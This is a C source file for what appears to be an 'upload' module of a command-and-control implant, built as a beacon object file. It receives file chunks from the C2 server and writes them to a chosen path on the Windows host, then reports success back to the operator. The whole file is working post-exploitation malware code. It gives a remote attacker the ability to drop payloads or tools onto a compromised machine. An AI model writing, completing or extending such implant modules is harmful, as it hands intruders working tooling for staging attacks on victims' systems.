/*
 * upload.o - receive a file from the C2 server and write it to disk.
 *
 * Task args   : target path (string)
 * T_DATA feed : [4B 0x02][4B offset][data...]   chunks
 *               [4B 0xFFFFFFFF]                 end
 */
#include <windows.h>
#include "../bof.h"

void go(char *args, int length) {
    char *path = (char *)b_malloc(length + 1);
    if (!path) { b_send(POUT_ERR, "oom", 3); return; }
    memcpy(path, args, length);
    path[length] = 0;

    HANDLE hf = CreateFileA(path, GENERIC_WRITE, 0, NULL,
                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hf == INVALID_HANDLE_VALUE) {
        char e[256];
        int l = wsprintfA(e, "ERROR: cannot create %s (err=%lu)\r\n", path, GetLastError());
        b_send(POUT_ERR, e, l);
        b_send(POUT_DONE, "", 0);
        return;
    }

    char *buf = (char *)b_malloc(65536 + 8);
    DWORD total = 0;
    while (buf) {
        int n = b_gets(buf, 65536 + 8);
        if (n <= 0) break;
        if (n >= 4 && *(DWORD *)buf == 0xFFFFFFFF) {
            /* end of transfer */
            break;
        }
        if (n > 8 && *(DWORD *)buf == 0x02) {
            DWORD w;
            WriteFile(hf, buf + 8, n - 8, &w, NULL);
            total += w;
        }
    }
    CloseHandle(hf);

    char ok[256];
    int l = wsprintfA(ok, "[+] Upload complete: %s (%lu bytes)\r\n", path, total);
    b_send(POUT_INFO, ok, l);
    b_send(POUT_DONE, "", 0);
}
